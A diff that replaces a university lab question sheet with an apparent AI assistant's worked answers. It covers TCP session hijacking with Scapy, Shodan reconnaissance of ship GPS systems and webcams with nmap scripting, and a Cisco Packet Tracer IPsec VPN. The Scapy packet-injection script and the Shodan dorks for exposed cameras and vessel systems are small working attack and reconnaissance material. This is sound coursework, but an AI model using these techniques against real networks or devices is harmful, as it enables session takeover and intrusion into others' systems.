@@ -1,63 +1,162 @@
+Great! Let’s go through each experiment step-by-step. I’ll provide:
 
----
+Setup Instructions
 
-📋 Questions Breakdown:
+Commands/scripts
 
-Q1. Demonstrate TCP Session Hijacking using Scapy or manually constructed packets (10 marks)
+Expected Output
 
-Steps:
+Viva Questions (on request)
 
-(a) Monitor a TCP session and identify the correct sequence number
-
-(b) Inject a spoofed packet (e.g., a fake command or payload)
-
-(c) Show the session disruption or data tampering on the victim’s end
-
-
-CO Mapping: PCC-CS691.4
-PO Mapping: PO1, PO2, PO5, PO9
-BT Level: 3
 
 
 ---
 
-Q2. Perform Shodan-based reconnaissance (10 marks)
+✅ Experiment 1: TCP Session Hijacking using Scapy
 
-Steps:
+Tools: Kali Linux, Scapy (Python)
 
-(a) Locate boats and ship communication/GPS systems
+Step-by-Step:
 
-(b) Search and identify live internet-connected cameras
+Step 1: Monitor a TCP session and get sequence number
 
-(c) Write and execute a small Nmap NSE script to automate fingerprinting of one discovered device
+Start Wireshark on interface (e.g. eth0):
+
+sudo wireshark
+
+Apply filter: tcp
+
+Identify a session (e.g., telnet or HTTP) and note:
+
+Source/Dest IP
+
+Port
+
+Sequence Number
 
 
-CO Mapping: PCC-CS691.3
-PO Mapping: PO1, PO2, PO5, PO9
-BT Level: 4
+
+Step 2: Craft spoofed packet
+
+Use Scapy to inject a spoofed TCP packet:
+
+from scapy.all import *
+
+target_ip = "192.168.1.5"
+source_ip = "192.168.1.10"
+target_port = 23
+source_port = 1024
+seq_num = 123456789
+ack_num = 987654321
+
+packet = IP(src=source_ip, dst=target_ip)/TCP(sport=source_port, dport=target_port, flags="PA", seq=seq_num, ack=ack_num)/"malicious_command"
+send(packet)
+
+Step 3: Observe Disruption
+
+Monitor victim terminal.
+
+You’ll see spoofed commands executed or TCP session dropped.
+
 
 
 ---
 
-Q3. Implement a Site-to-Site VPN tunnel using Cisco Packet Tracer (20 marks)
+✅ Experiment 2: Shodan-based Recon + Nmap NSE
 
-CO Mapping: PCC-CS691.4
-PO Mapping: PO1, PO2, PO5, PO9
-BT Level: 4
+Tools: Shodan CLI, Nmap, Kali Linux
+
+Step 1: Locate GPS/Boat Systems (Shodan)
+
+shodan search "AIS GPS"  # AIS used in ships
+shodan search "port:80 title:Boat"
+
+Step 2: Identify Internet-connected Cameras
+
+shodan search "webcamXP"
+shodan search "port:554 has_screenshot:true"
+
+Step 3: Nmap NSE Script
+
+Scan one IP found on Shodan:
+
+nmap -sV --script http-title -p 80 198.51.100.10
+
+Create and execute a basic NSE script:
+
+-- myscript.nse
+description = [[Simple HTTP Title Grabber]]
+author = "Student"
+categories = {"discovery"}
+
+portrule = shortport.http
+
+action = function(host, port)
+  return "Scanning " .. host.ip
+end
+
+Run it:
+
+nmap --script ./myscript.nse 198.51.100.10
 
 
 ---
 
-Would you like:
+✅ Experiment 3: Site-to-Site VPN in Cisco Packet Tracer
 
-Viva questions for each experiment?
+Tools: Cisco Packet Tracer
 
-Detailed steps for execution?
+Step-by-Step:
 
-Scapy/Nmap scripts for Q1 and Q2?
+1. Drag and drop:
 
-Cisco Packet Tracer steps for VPN in Q3?
+2 Routers (e.g., 2911)
+
+2 Switches
+
+2 PCs
 
 
-Let me know how you'd like to proceed.
 
+2. Configure IPs:
+
+PC-A: 192.168.1.2/24
+
+PC-B: 192.168.2.2/24
+
+Routers LAN & WAN accordingly
+
+
+
+3. Enable IKE and IPsec: On both routers (CLI):
+
+crypto isakmp policy 1
+encr aes
+hash sha
+authentication pre-share
+group 5
+lifetime 86400
+
+crypto isakmp key 123456 address <peer-ip>
+crypto ipsec transform-set MYSET esp-aes esp-sha-hmac
+crypto map MYMAP 10 ipsec-isakmp
+set peer <peer-ip>
+set transform-set MYSET
+match address 101
+
+access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255
+interface s0/0/0
+crypto map MYMAP
+
+
+4. Test VPN:
+
+Ping from PC-A to PC-B
+
+Use simulation mode to observe VPN packets
+
+
+
+
+
+---
